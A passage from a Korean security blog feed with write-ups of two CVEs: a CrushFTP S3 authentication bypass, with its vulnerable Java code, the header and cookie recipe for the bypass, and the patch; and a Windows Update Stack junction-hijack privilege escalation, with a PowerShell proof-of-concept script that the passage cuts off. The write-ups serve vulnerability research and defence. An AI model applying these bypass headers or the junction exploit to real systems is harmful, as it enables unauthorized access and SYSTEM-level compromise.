&#xC624;&#xBC84;&#xB85C;&#xB529;&#xC73C;&#xB85C; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xB3FC; &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8; &#xBC0F; &#xD30C;&#xC77C; &#xD0C8;&#xCDE8;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>AWS S3 &#xC778;&#xC99D; &#xD5E4;&#xB354;</li></ul><pre><code class="hljs dts"><span class="hljs-symbol">Authorization:</span> AWS4-HMAC-SHA256 Credential=<span class="hljs-params">&lt;AccessKey&gt;</span>/<span class="hljs-params">&lt;Date&gt;</span>/<span class="hljs-params">&lt;Region&gt;</span><span class="hljs-meta-keyword">/s3/</span>aws4_request, SignedHeaders=<span class="hljs-params">&lt;Headers&gt;</span>, Signature=<span class="hljs-params">&lt;Signature&gt;</span></code></pre><p>AWS&#xC758; S3 API &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC740; Authorization &#xD5E4;&#xB354; &#xB0B4; Credential &#xD0A4;&#xC758; &#xAC12;&#xC778; AccessKey&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC2DD;&#xBCC4;&#xD55C; &#xB4A4; &#xD574;&#xB2F9; &#xAC12;&#xACFC; Signature&#xB97C; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xD558;&#xBA70; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. CrushFTP &#xAD6C;&#xD604;&#xC5D0;&#xC11C;&#xB294; <code>Credential=&lt;username&gt;[~password]/&#x2026;</code> &#xD615;&#xD0DC;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBA70;, <code>&lt;username&gt;</code>&#xACFC; <code>~password</code>&#xB97C; &#xBD84;&#xB9AC;&#xD574; &#xB0B4;&#xBD80; &#xC778;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xCF54;&#xB4DC;-loginCheckHeaderAuth-&#xBA54;&#xC18C;&#xB4DC;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xCF54;&#xB4DC;-loginCheckHeaderAuth-&#xBA54;&#xC18C;&#xB4DC;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xCF54;&#xB4DC; (loginCheckHeaderAuth &#xBA54;&#xC18C;&#xB4DC;)"></a>&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xCF54;&#xB4DC; (loginCheckHeaderAuth &#xBA54;&#xC18C;&#xB4DC;)</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.headerLookup.containsKey(<span class="hljs-string">&quot;Authorization&quot;</span>.toUpperCase()) &amp;&amp;    <span class="hljs-keyword">this</span>.headerLookup.getProperty(<span class="hljs-string">&quot;Authorization&quot;</span>.toUpperCase()).trim().startsWith(<span class="hljs-string">&quot;AWS4-HMAC&quot;</span>)) {    String s3_username = <span class="hljs-keyword">this</span>.headerLookup.getProperty(<span class="hljs-string">&quot;Authorization&quot;</span>.toUpperCase()).trim();    String s3_username2 = s3_username.substring(s3_username.indexOf(<span class="hljs-string">&quot;=&quot;</span>) + <span class="hljs-number">1</span>);    String s3_username3 = s3_username2.substring(<span class="hljs-number">0</span>, s3_username2.indexOf(<span class="hljs-string">&quot;/&quot;</span>));    String user_pass = <span class="hljs-keyword">null</span>;    String user_name = s3_username3;    <span class="hljs-keyword">boolean</span> lookup_user_pass = <span class="hljs-keyword">true</span>; <span class="hljs-comment">//&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529; &#xC720;&#xBC1C; &#xD50C;&#xB798;&#xADF8;</span>    <span class="hljs-comment">// if&#xBB38;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; &#xD2B9;&#xC815; lookup_user_pass&#xB294; true&#xB85C; &#xC720;&#xC9C0;</span>    <span class="hljs-keyword">if</span> (s3_username3.indexOf(<span class="hljs-string">&quot;~&quot;</span>) &gt;= <span class="hljs-number">0</span>) {        user_pass = user_name.substring(user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>) + <span class="hljs-number">1</span>);        user_name = user_name.substring(<span class="hljs-number">0</span>, user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>));        lookup_user_pass = <span class="hljs-keyword">false</span>;    }<span class="hljs-comment">// lookup_user_pass&#xAC00; true&#xB85C; &#xC804;&#xB2EC;&#xB420; &#xACBD;&#xC6B0; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529; &#xBC1C;&#xC0DD;&#xB418;&#xBA70; &#xC778;&#xC99D;&#xC6B0;&#xD68C;</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.thisSession.login_user_pass(lookup_user_pass, <span class="hljs-keyword">false</span>, user_name, lookup_user_pass ? <span class="hljs-string">&quot;&quot;</span> : user_pass)) {    }}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; S3 &#xC2A4;&#xD0C0;&#xC77C;&#xC758; API &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC694;&#xCCAD;&#xC744; &#xD588;&#xC744; &#xB54C; &#xD5E4;&#xB354;&#xC758; Authorizion &#xD5E4;&#xB354;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC8FC;&#xC694; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294; &#xD50C;&#xB798;&#xADF8; <strong><code>lookup_user_pass</code></strong> </p><ul><li>true: &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xB0B4;&#xBD80; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; &#xC870;&#xD68C;</li><li>false: &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC870;&#xD68C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC804;&#xB2EC;&#xBC1B;&#xC740; AccessKey &#xAC12; &#xB0B4; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;</li></ul><p>Authorization &#xD5E4;&#xB354;&#xC758; Credential &#xD0A4;&#xC758; &#xAC12;(s3_username3 &#xBCC0;&#xC218;)&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; user_name, user_pass &#xD30C;&#xC2F1;</p><ul><li>Credential &#xD0A4; &#xAC12;(<acesskey>)&#xC5D0;&#xB294; {username~passwrod}&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, ~&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; if&#xBB38;&#xC744; &#xD0C0;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xBA70; <strong><code>lookup_user_pass</code></strong> &#xD50C;&#xB798;&#xADF8;&#xAC00; <strong><code>true</code></strong>&#xB85C; &#xC720;&#xC9C0;</acesskey></li></ul><p>login_user_pass &#xBA54;&#xC18C;&#xB4DC;&#xC5D0; lookup_user_pass &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC804;&#xB2EC;&#xB418;&#xC9C0;&#xB9CC; <strong>**login_user_pass &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; anyPass&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5B4; </strong><code>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529;&#xC774; &#xBC1C;&#xC0DD;</code>**&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="login-user-pass-&#xBA54;&#xC18C;&#xB4DC;"><a href="#login-user-pass-&#xBA54;&#xC18C;&#xB4DC;" class="headerlink" title="login_user_pass &#xBA54;&#xC18C;&#xB4DC;"></a>login_user_pass &#xBA54;&#xC18C;&#xB4DC;</h3><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">login_user_pass</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> anyPass, <span class="hljs-keyword">boolean</span> doAfterLogin, String user_name, String user_pass)</span> <span class="hljs-keyword">throws</span> Exception </span>{                                                                                                                                <span class="hljs-number">2</span>     <span class="hljs-keyword">if</span> (user_name.length() &lt;= <span class="hljs-number">2000</span>) {        ...        <span class="hljs-keyword">int</span> length = user_pass.length();        ServerStatus serverStatus = ServerStatus.thisObj;        <span class="hljs-keyword">if</span> (length &lt;= ServerStatus.IG(<span class="hljs-string">&quot;max_password_length&quot;</span>) || user_name.startsWith(<span class="hljs-string">&quot;SSO_OIDC_&quot;</span>)) {            Log.log(<span class="hljs-string">&quot;LOGIN&quot;</span>, <span class="hljs-number">3</span>, <span class="hljs-keyword">new</span> Exception(String.valueOf(LOC.G(<span class="hljs-string">&quot;INFO:Logging in with user:&quot;</span>)) + user_name));            uiPUT(<span class="hljs-string">&quot;last_logged_command&quot;</span>, <span class="hljs-string">&quot;USER&quot;</span>);            ...<span class="hljs-comment">// &#xC778;&#xC99D; &#xB85C;&#xC9C1; (anyPass &#xD65C;&#xC131;&#xD654;&#xC2DC; &#xC6B0;&#xD68C;)</span>            <span class="hljs-keyword">boolean</span> verified = verify_user(user_name, verify_password, anyPass, doAfterLogin);            <span class="hljs-keyword">if</span> (verified &amp;&amp; <span class="hljs-keyword">this</span>.user != <span class="hljs-keyword">null</span>) {                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            }        }    }    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;}</code></pre><p>anyPass&#xB97C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; login_user_pass &#xBA54;&#xC18C;&#xB4DC;&#xB294; verify_user&#xC5D0; &#xD574;&#xB2F9; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="verify-user-&#xBA54;&#xC18C;&#xB4DC;-&#xC77C;&#xBD80;"><a href="#verify-user-&#xBA54;&#xC18C;&#xB4DC;-&#xC77C;&#xBD80;" class="headerlink" title="verify_user &#xBA54;&#xC18C;&#xB4DC; &#xC77C;&#xBD80;"></a>verify_user &#xBA54;&#xC18C;&#xB4DC; &#xC77C;&#xBD80;</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (anyPass &amp;&amp; user.getProperty(<span class="hljs-string">&quot;username&quot;</span>).equalsIgnoreCase(the_user)) {    <span class="hljs-keyword">return</span> user;}</code></pre><p>anyPass&#xAC00; &#xD65C;&#xC131;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC744; &#xACBD;&#xC6B0; &#xD2B9;&#xC815; username&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p><img src="/2025/04/19/empty/CVE-2025-31161/poc.png" alt="image.png"></p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD5E4;&#xB354;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xACBD;&#xB85C;: &amp;c2f={} // &#xCFE0;&#xD0A4; &#xD5E4;&#xB354;&#xAC12;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xAD6C;&#xC131;</li><li>Cookie&#xD5E4;&#xB354;: CrushAuth&#xD0A4; &#xAC12;&#xC744; {13&#xC790;&#xB9AC;<em>&#xB79C;&#xB364;&#xC22B;&#xC790;}</em>{30&#xC790;&#xB9AC;_&#xB79C;&#xB364;&#xAC12;}{c2f} &#xAD6C;&#xC131;</li><li>Authorization &#xD5E4;&#xB354;: AWS4-HMAC-SHA256 Credentail={username}/</li></ul><h3 id="&#xD328;&#xCE58;"><a href="#&#xD328;&#xCE58;" class="headerlink" title="&#xD328;&#xCE58;"></a>&#xD328;&#xCE58;</h3><p>&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>1) lookup_password &#xAE30;&#xB2A5; &#xBE44;&#xD65C;&#xC131;&#xD654;</p><pre><code class="hljs java"><span class="hljs-comment">// lookup_password &#xAE30;&#xB2A5;&#xC744; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xD558;&#xB294; &#xC124;&#xC815;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</span>default_settings.put(<span class="hljs-string">&quot;s3_auth_lookup_password_supported&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>);</code></pre><p>2) Authorization &#xD5E4;&#xB354; &#xB0B4; Credential &#xD0A4; &#xAC12; &#xAD6C;&#xC131; &#xAC80;&#xC99D;</p><pre><code class="hljs java"><span class="hljs-comment">// Authorization &#xD5E4;&#xB354;&#xC758; Credential &#xD0A4; &#xAC12;&#xC5D0; ~&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;</span><span class="hljs-keyword">if</span> (s3_username3.indexOf(<span class="hljs-string">&quot;~&quot;</span>) &gt;= <span class="hljs-number">0</span>) {    user_pass = user_name.substring(user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>) + <span class="hljs-number">1</span>);    user_name = user_name.substring(<span class="hljs-number">0</span>, user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>));    lookup_user_pass = <span class="hljs-keyword">false</span>;} <span class="hljs-keyword">else</span> {    ServerStatus serverStatus = ServerStatus.thisObj;    <span class="hljs-keyword">if</span> (!ServerStatus.BG(<span class="hljs-string">&quot;s3_auth_lookup_password_supported&quot;</span>)) {        <span class="hljs-keyword">return</span>;    }}</code></pre><p>3) &#xC778;&#xC99D; &#xB85C;&#xC9C1; &#xBCC0;&#xACBD;</p><pre><code class="hljs java">Properties tmp_user = UserTools.ut.getUser(<span class="hljs-keyword">this</span>.thisSession.server_item.getProperty(<span class="hljs-string">&quot;linkedServer&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), user_name);<span class="hljs-keyword">if</span> (tmp_user != <span class="hljs-keyword">null</span> &amp;&amp; lookup_user_pass) {    <span class="hljs-comment">// lookup_password &#xC218;&#xD589; (&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC870;&#xD68C;)</span>    user_pass = com.crushftp.client.Common.encryptDecrypt(tmp_user.getProperty(<span class="hljs-string">&quot;password&quot;</span>), <span class="hljs-keyword">false</span>);}<span class="hljs-keyword">if</span> (tmp_user != <span class="hljs-keyword">null</span> &amp;&amp; user_pass != <span class="hljs-keyword">null</span>) {    <span class="hljs-comment">// &#xC544;&#xC774;&#xB514;/&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xAC80;&#xC99D; &#xC218;&#xD589;</span>}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Authentication-Bypass/">Authentication Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/empty/">empty</category>
      
      <category domain="https://hackyboiz.github.io/tags/CrushFTP/">CrushFTP</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/19/empty/CVE-2025-31161/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-21204: Windows Update Stack의 Improper Link Following으로 인한 Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2025/04/17/pwndorei/2025-04-17/</link>
      <guid>https://hackyboiz.github.io/2025/04/17/pwndorei/2025-04-17/</guid>
      <pubDate>Thu, 17 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cyberdom.blog/abusing-the-windows-update-stack-to</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cyberdom.blog/abusing-the-windows-update-stack-to-gain-system-access-cve-2025-21204/">https://cyberdom.blog/abusing-the-windows-update-stack-to-gain-system-access-cve-2025-21204/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 4&#xC6D4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xC804;&#xC758; Update Stack&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Windows<ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21204/">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21204/</a></li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-21204&#xB294; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; <code>MoUsoCoreWorker.exe</code>&#xC640; <code>UsoClient.exe</code> &#xAC19;&#xC740; SYSTEM &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC5D0; &#xC758;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC758;&#xD574; <code>C:\ProgramData\Microsoft\UpdateStack\Tasks</code> &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB098; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xB370; &#xC774;&#xB54C; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD3F4;&#xB354;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xD3F4;&#xB354;&#xC758; &#xC815;&#xC158;&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xD560; &#xC218; &#xC788;&#xACE0; &#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;&#xC5D0; &#xD30C;&#xC6CC;&#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB4F1;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC704;&#xCE58;&#xC2DC;&#xD0A8;&#xB2E4;.</li><li><code>C:\ProgramData\Microsoft\UpdateStack\Tasks</code>&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; 1.&#xC5D0;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xACBD;&#xB85C;&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xC815;&#xC158;&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xD55C;&#xB2E4;.</li><li>&#xC608;&#xC57D;&#xB41C; &#xC791;&#xC5C5;&#xC5D0; &#xC758;&#xD574; &#xD639;&#xC740; &#xC9C1;&#xC811; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574;&#xC11C; <code>UsoClient.exe</code>, <code>MoUsoCoreWorker.exe</code>, <code>TiWorker.exe</code>&#xC640; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</li><li>&#xC0DD;&#xC131;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4;&#xB2E4;.</li></ol><p>&#xC544;&#xB798;&#xB294; &#xC774;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294; &#xD30C;&#xC6CC;&#xC258;&#xB85C; &#xC791;&#xC131;&#xB41C; <a href="https://raw.githubusercontent.com/eshlomo1/CloudSec/refs/heads/main/Attacking%20the%20Cloud/CVE-2025-21204/Exploit-CVE2025-UpdateStackLPE-NonAdmin.ps1">PoC</a>&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC74C;&#xC744; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-comment">&lt;#</span><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><span class="hljs-comment">    CVE-2025-21204 exploit simulation for non-admin users via junction-based path hijack.</span><span class="hljs-comment"></span><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><span class="hljs-comment">    Drops a bait payload in a user-controlled directory, creates a junction to hijack the Update Stack path,</span><span class="hljs-comment">    and triggers the update process to test if SYSTEM accesses the payload.</span><span class="hljs-comment">    The script provide the poc that allows to run this actions. </span><span class="hljs-comment"></span><span class="hljs-comment">.AUTHOR</span><span class="hljs-comment">    Elli Shlomo</span><span class="hljs-comment"></span><span class="hljs-comment">#&gt;</span><span class="hljs-comment"># Paths</span><span class="hljs-variable">$trapPath</span>      = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\Microsoft\UpdateStack\Tasks&quot;</span><span class="hljs-variable">$updateStackRealPath</span> = <span class="hljs-string">&quot;C:\ProgramData\Microsoft\UpdateStack\Tasks&quot;</span><span class="hljs-variable">$payloadPath</span>   = <span class="hljs-string">&quot;<span class="hljs-variable">$trapPath</span>\UpdateStackAgent.dll&quot;</span><span class="hljs-variable">$proofPath</span>     = <span class="hljs-string">&quot;C:\Users\Public\cve2025-proof.log&quot;</span><span class="hljs-variable">$logPath</span>       = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\CVE2025\simulation.log&quot;</span><span class="hljs-variable">$evidencePath</span>  = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\CVE2025\evidence.txt&quot;</span><span class="hljs-variable">$verdictPath</span>   = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\CVE2025\vulnerable.txt&quot;</span><span class="hljs-variable">$verboseLog</span>    = <span class="hljs-string">&quot;<span class="hljs-variable">$env:TEMP</span>\cve2025-verbose.log&quot;</span><span class="hljs-comment"># Intro</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n[*] CVE-2025-21204 Exploit Simulation (Non-Admin)&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Trap directory       : <span class="hljs-variable">$trapPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Payload DLL path     : <span class="hljs-variable">$payloadPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] SYSTEM proof file    : <span class="hljs-variable">$proofPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Simulation log       : <span class="hljs-variable">$logPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Evidence file        : <span class="hljs-variable">$evidencePath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Verdict result       : <span class="hljs-variable">$verdictPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Verbose transcript   : <span class="hljs-variable">$verboseLog</span>`n&quot;</span><span class="hljs-comment"># Start transcript</span><span class="hljs-built_in">Start-Transcript</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$verboseLog</span> <span class="hljs-literal">-Force</span><span class="hljs-comment"># Ensure directories exist</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Creating necessary directories...&quot;</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$trapPath</span> <span class="hljs-literal">-ItemType</span> Directory <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> (<span class="hljs-built_in">Split-Path</span> <span class="hljs-variable">$logPath</span>) <span class="hljs-literal">-ItemType</span> Directory <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Directories ready.`n&quot;</span><span class="hljs-comment"># Payload content</span><span class="hljs-variable">$payload</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">Payload executed by SYSTEM at: <span class="hljs-variable">$</span>(Get-Date)</span><span class="hljs-string">&quot;@</span><span class="hljs-comment"># Write bait payload</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Writing payload to: <span class="hljs-variable">$payloadPath</span>&quot;</span><span class="hljs-variable">$payload</span> | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> <span class="hljs-variable">$payloadPath</span> <span class="hljs-literal">-Encoding</span> ASCII<span class="hljs-variable">$payload</span> | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> <span class="hljs-variable">$proofPath</span> <span class="hljs-literal">-Append</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Payload written.`n&quot;</span><span class="hljs-comment"># Simulation metadata log</span><span class="hljs-variable">$log</span> = <span class="hljs-string">@&quot;</span><span class="hljs-string">CVE-2025-21204 Exploit Simulation</span><span class="hljs-string">-------------------------------------</span><span class="hljs-string">Date         : <span class="hljs-variable">$</span>(Get-Date)</span><span class="hljs-string">Payload File : <span class="hljs-variable">$payloadPath</span></span><span class="hljs-string">Hijack Path  : <span 